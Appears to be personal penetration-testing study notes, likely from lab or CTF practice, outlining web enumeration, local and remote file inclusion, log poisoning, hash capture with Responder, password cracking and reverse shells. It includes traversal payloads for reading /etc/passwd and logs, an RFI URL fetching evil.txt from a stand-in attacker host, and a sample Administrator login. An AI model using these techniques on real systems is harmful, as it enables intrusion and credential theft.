# Zero-to-Hero-Pen-Testing-Notes-

1.Always maunally ennumerate and check the source code control+u/ Check `/robots.txt` `/sitemap.xml`\
2.`gobuster dir -u http://$IP:PORT -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` -b (for bad servercode) -f (add this flag if gobuster is not returing any results for a long time) \
2.5 `wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --sc 200 http://$IP/FUZZ` \ 
2.6. Check wappalayzer to check basic info of the page. \
3. `nikto -h $IP`   
4. If you do not find any specific directory add the -f flag to go buster and rerun\
5. If you find some directory and stuck  make sure to run gobuster again with the new directory i.e http:\\$IP/newDirectory  
6. Searchsploit technologies for vulnerabiltieis `nmap -p 80,443  --script=*vuln* $IP`

# Possible web vulnerabilities
## LFI
1. LocalFile Inclusion: We can log poision if linux based or try remote access control if Window
2. Check links ending with `?file=index.php ?book=`  (Possible vulnerabilities in source code)
3. book= `../../../../etc/passwd`   (Figure out if the server is hosting on **Window or Apache )
4. `../../../../var/www/html/index.php`  html to confirm log poisoning 
5. Add  `../ ../../../../` and check if the following following files exists.
6. `/etc/passwd`\ `/var/log/mail/USER`\  `/var/log/apache2/access.log`\  `/proc/self/environ`\  `/tmp/sess_ID`\ `/var/lib/php5/sess_ID`\ `/var/log/auth/log`\  
7. `/windows/system32/drivers/etc/hosts` (for **window host**)\  Go to step 12 
8. Now that we have confirmed LFI vulnerablity, **lets log poision** `../../../../var/log/apache2/access.log` via invalid connection request.
9. Connect to `nc -nv $IP port`.Insert commandline exeuction payload (This depends on what techonology it is using. php ..etc)
10. Check for sucessful log poisioning `../../../../var/log/apache2/access.log&cmd=id`.
11. If you receive command execution, we will insert a reversshell via url encoding. Done. (wrapped and url encode)
12. Use responder to capture. `sudo python3 Responder.py -I tun0. inject file=//$MyIP/testShare in the url`. Use john the ripper to match hash. 
13. `john -w=/usr/share/wordlists/rockyou.txt hash.txt`
14. login to window .`evil-winrm -i 10.129.147.34 -u Administrator -p badminton`
## RFI
1. Example Vulerable wesbites: `http://exampe.com/index.php?page=http://attackerserver.com/evil.txt`
2. Host a server with python `python3 -m http.server 8080` with reverseshell code.
## Login page
1. Always check for default credentials
2. SQL injection
3. Burpite suite brute force, Hydra (use with caution can be locked out) 
4. Searchsploit Any version info of the login page? ex: pfsense 2.3.2
## Domain/Subdomain 
1. When seeing a contact page, with emails, make note of them, check if they are using some special domain \
2. change /etc/hosts and add the host name
3. gobuster vhost --append-domain -u http://$DomainName -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \

## XSS

## Getting a stable reverse shell
0. Check what language/ technology it is using ex: php, python, perl and possibly the version, to know which revershell to pick.
1. https://www.revshells.com/
2. Payloads. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python
